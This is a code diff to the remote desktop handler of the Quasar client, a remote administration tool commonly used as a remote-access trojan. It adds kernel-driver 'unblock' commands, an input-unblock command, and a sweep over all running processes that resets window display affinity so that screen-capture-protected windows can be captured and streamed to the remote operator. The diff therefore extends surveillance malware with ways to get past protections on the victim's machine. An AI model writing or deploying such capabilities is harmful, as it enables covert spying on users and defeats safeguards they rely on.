@@ -1,25 +1,49 @@
 ﻿using Quasar.Client.Helper;
+using Quasar.Client.Logging;
+using Quasar.Client.RemoteDesktop;
+using Quasar.Client.RemoteDesktop.Driver;
 using Quasar.Common.Enums;
 using Quasar.Common.Messages;
 using Quasar.Common.Networking;
 using Quasar.Common.Video;
 using Quasar.Common.Video.Codecs;
 using System;
+using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Windows.Forms;
+using System.Threading;
 
 namespace Quasar.Client.Messages
 {
     public class RemoteDesktopHandler : NotificationMessageProcessor, IDisposable
     {
+        private readonly KernelDriverLogger _driverLogger;
+        private readonly KernelUnblockCommand _kernelUnblock;
+        private readonly KernelDriverManager _driverManager;
+        private readonly InputUnblockCommand _inputUnblock;
         private UnsafeStreamCodec _streamCodec;
+        private KernelDriverState _currentDriverState = KernelDriverState.Unknown;
+        private string _driverVersion = string.Empty;
+        private long _nextFrameId;
+        private long _frameCounter;
+
+        public RemoteDesktopHandler()
+        {
+            _driverLogger = new KernelDriverLogger();
+            _kernelUnblock = new KernelUnblockCommand(_driverLogger);
+            _driverManager = new KernelDriverManager(_driverLogger);
+            _inputUnblock = new InputUnblockCommand(_driverLogger);
+        }
 
         public override bool CanExecute(IMessage message) => message is GetDesktop ||
                                                              message is DoMouseEvent ||
                                                              message is DoKeyboardEvent ||
-                                                             message is GetMonitors;
+                                                             message is GetMonitors ||
+                                                             message is DoKernelUnblock ||
+                                                             message is GetKernelDriverStatus ||
+                                                             message is DoInputUnblock;
 
         public override bool CanExecuteFrom(ISender sender) => true;
 
@@ -37,6 +61,15 @@ namespace Quasar.Client.Messages
                     Execute(sender, msg);
                     break;
                 case GetMonitors msg:
+                    Execute(sender, msg);
+                    break;
+                case DoKernelUnblock msg:
+                    Execute(sender, msg);
+                    break;
+                case GetKernelDriverStatus msg:
+                    Execute(sender, msg);
+                    break;
+                case DoInputUnblock msg:
                     Execute(sender, msg);
                     break;
             }
@@ -66,11 +99,23 @@ namespace Quasar.Client.Messages
                 _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
             }
 
+            if (message.ForceAffinityReset)
+                ResetAllWindowAffinities();
+
+            var driverStatus = _driverManager.GetStatus(false);
+            _currentDriverState = driverStatus.State;
+            _driverVersion = driverStatus.Version ?? _driverVersion;
+            long frameId = Interlocked.Increment(ref _nextFrameId);
+
             BitmapData desktopData = null;
             Bitmap desktop = null;
             try
             {
-                desktop = ScreenHelper.CaptureScreen(message.DisplayIndex);
+                desktop = ScreenHelper.CaptureScreen(new ScreenHelper.CaptureOptions
+                {
+                    DisplayIndex = message.DisplayIndex,
+                    IncludeCursor = message.IncludeCursor
+                });
                 desktopData = desktop.LockBits(new Rectangle(0, 0, desktop.Width, desktop.Height),
                     ImageLockMode.ReadWrite, desktop.PixelFormat);
 
@@ -86,7 +131,9 @@ namespace Quasar.Client.Messages
                         Image = stream.ToArray(),
                         Quality = _streamCodec.ImageQuality,
                         Monitor = _streamCodec.Monitor,
-                        Resolution = _streamCodec.Resolution
+                        Resolution = _streamCodec.Resolution,
+                        DriverState = driverStatus.State,
+                        FrameId = frameId
                     });
                 }
             }
@@ -99,7 +146,9 @@ namespace Quasar.Client.Messages
                         Image = null,
                         Quality = _streamCodec.ImageQuality,
                         Monitor = _streamCodec.Monitor,
-                        Resolution = _streamCodec.Resolution
+                        Resolution = _streamCodec.Resolution,
+                        DriverState = driverStatus.State,
+                        FrameId = frameId
                     });
                 }
 
@@ -183,6 +232,108 @@ namespace Quasar.Client.Messages
         private void Execute(ISender client, GetMonitors message)
         {
             client.Send(new GetMonitorsResponse {Number = Screen.AllScreens.Length});
+        }
+
+        private void ResetAllWindowAffinities()
+        {
+            try
+            {
+                int attempted = 0;
+                int reset = 0;
+                int failures = 0;
+
+                foreach (var process in Process.GetProcesses())
+                {
+                    try
+                    {
+                        foreach (var handle in NativeMethodsHelper.EnumerateProcessWindows(process.Id, includeChildWindows: true))
+                        {
+                            attempted++;
+                            var result = NativeMethodsHelper.ResetWindowDisplayAffinity(handle, skipIfAlreadyReset: false, out var error);
+                            if (result == NativeMethodsHelper.WindowAffinityResetResult.ResetPerformed)
+                                reset++;
+                            else if (result == NativeMethodsHelper.WindowAffinityResetResult.Failed)
+                            {
+                                failures++;
+                                if (error != 0)
+                                    _driverLogger.Warning($"Force affinity reset failed for handle 0x{handle.ToInt64():X}: 0x{error:X}");
+                            }
+                        }
+                    }
+                    catch
+                    {
+                        // Skip processes we cannot inspect (system services, etc.).
+                    }
+                    finally
+                    {
+                        process.Dispose();
+                    }
+                }
+
+                _driverLogger.Info($"Force affinity reset sweep completed: attempted={attempted}, reset={reset}, failures={failures}.");
+            }
+            catch (Exception ex)
+            {
+                _driverLogger.Warning($"Force affinity reset failed: {ex.Message}");
+            }
+        }
+
+        private void Execute(ISender client, DoKernelUnblock message)
+        {
+            ThreadPool.QueueUserWorkItem(_ =>
+            {
+                try
+                {
+                    var driverState = _driverManager.EnsureState(message.DriverAction);
+                    _currentDriverState = driverState;
+                    var result = _kernelUnblock.Execute(message, driverState);
+                    client.Send(result);
+                }
+                catch (Exception ex)
+                {
+                    client.Send(new KernelUnblockResult
+                    {
+                        Result = KernelUnblockResultCode.Failed,
+                        ProcessName = message.ProcessName,
+                        DriverState = _currentDriverState,
+                        Message = ex.Message
+                    });
+                }
+            });
+        }
+
+        private void Execute(ISender client, GetKernelDriverStatus message)
+        {
+            var driverState = _driverManager.EnsureState(message.DriverAction);
+            _currentDriverState = driverState;
+
+            var status = _driverManager.GetStatus(message.ForceRefresh);
+            _currentDriverState = status.State;
+            _driverVersion = status.Version ?? string.Empty;
+            client.Send(status);
+        }
+
+        private void Execute(ISender client, DoInputUnblock message)
+        {
+            ThreadPool.QueueUserWorkItem(_ =>
+            {
+                try
+                {
+                    var result = _inputUnblock.Execute(message);
+                    client.Send(result);
+                }
+                catch (Exception ex)
+                {
+                    client.Send(new InputUnblockResult
+                    {
+                        ResultCode = InputUnblockResultCode.Failed,
+                        MouseUnlocked = message.UnblockMouse,
+                        KeyboardUnlocked = message.UnblockKeyboard,
+                        Message = ex.Message,
+                        DurationMilliseconds = 0
+                    });
+                }
+            });
         }
 
         /// <summary>
